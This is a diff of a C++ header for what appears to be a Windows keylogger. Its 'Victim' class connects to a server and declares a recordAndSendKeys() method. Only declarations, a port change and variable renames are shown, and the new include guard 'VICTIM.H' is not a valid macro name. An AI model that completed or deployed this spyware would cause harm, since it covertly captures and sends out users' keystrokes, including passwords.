@@ -1,4 +1,6 @@
-#pragma once
+#ifndef VICTIM.H
+#define VICTIM.H
+
 #include <iostream>
 #include <Winsock2.h>
 #include <Windows.h>
@@ -7,15 +9,15 @@
 
 #define ACTIVE_PROMISE_CODE -32767
 
-const int CONNECTION_PORT = 14707;
+const int CONNECTION_PORT = 18602;
 const std::string DEFAULT_IP = "127.0.0.1";
 
 class Victim {
 private:
 	WSADATA	_wsaData;
 	sockaddr_in _addr;
-	SOCKET _connection_socket;
-	std::string _target_ip_addr;
+	SOCKET _connectionSocket;
+	std::string _targetIpAddr;
 
 public:
 	Victim(const std::string& target_ip_addr = DEFAULT_IP);
@@ -23,3 +25,4 @@ public:
 	int connectToServer();
 	void recordAndSendKeys();
 };
+#endif
